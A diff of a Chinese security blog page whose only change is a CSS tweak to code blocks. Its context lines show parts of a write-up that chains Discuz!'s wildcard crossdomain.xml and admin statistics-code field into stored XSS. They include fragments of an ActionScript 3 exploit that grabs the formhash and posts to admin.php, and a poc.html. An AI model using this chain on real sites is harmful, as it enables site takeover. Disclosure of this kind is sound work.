@@ -33,7 +33,7 @@
 
     <section>
     <p>Discuz! 的 crossdomain.xml 一直是个大问题，默认的 crossdomain.xml 如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;cross-domain-policy&gt;</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;allow-access-from</span> <span style="color:#a6e22e">domain=</span><span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#f92672">/&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/cross-domain-policy&gt;</span>
@@ -42,7 +42,7 @@
 <p>后台的 “全局 － 站点信息 － 网站第三方统计代码” 处，可以通过 script 标签引入 js，前台访问直接触发，相当于构造了一枚完美的存储型 xss。</p>
 <p>以上 3 点，导致了 flash csrf 向存储型 xss 的转变。</p>
 <p>首先，编写用于发送请求的 flash，as3 代码如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">package</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">package</span>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">display</span>.<span style="color:#a6e22e">Sprite</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">import</span> <span style="color:#a6e22e">flash</span>.<span style="color:#a6e22e">events</span>.<span style="color:#a6e22e">Event</span>;
@@ -87,7 +87,7 @@
 </span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getFormHash</span>(<span style="color:#a6e22e">event</span><span style="color:#f92672">:</span><span style="color:#a6e22e">Event</span>)<span style="color:#f92672">:</span><span style="color:#66d9ef">void</span>
 </span></span><span style="display:flex;"><span>                {
 </span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// 获取formhash 后回调，写 js.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loader</span><span style="color:#f92672">:</span><span style="color:#a6e22e">URLLoader</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">URLLoader</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">target</span>);
+</span></span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loader</span><span style="color:#f92672">:</span><span style="color:#a6e22e">URLLoader</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">URLLoader</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">target</span>);
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pattern</span><span style="color:#f92672">:</span>RegExp <span style="color:#f92672">=</span> <span style="color:#e6db74">/&lt;input type=&#34;hidden&#34; name=&#34;formhash&#34; value=&#34;(\w{8})&#34; \/&gt;/</span>;
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">formhash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pattern</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">loader</span>.<span style="color:#a6e22e">data</span>)[<span style="color:#ae81ff">1</span>];
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">urlPost</span><span style="color:#f92672">:</span>String <span style="color:#f92672">=</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;admin.php&#34;</span>;
@@ -103,7 +103,7 @@
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>利用页面 poc.html：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
 </span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;FlashCSRF POC&lt;/<span style="color:#f92672">title</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
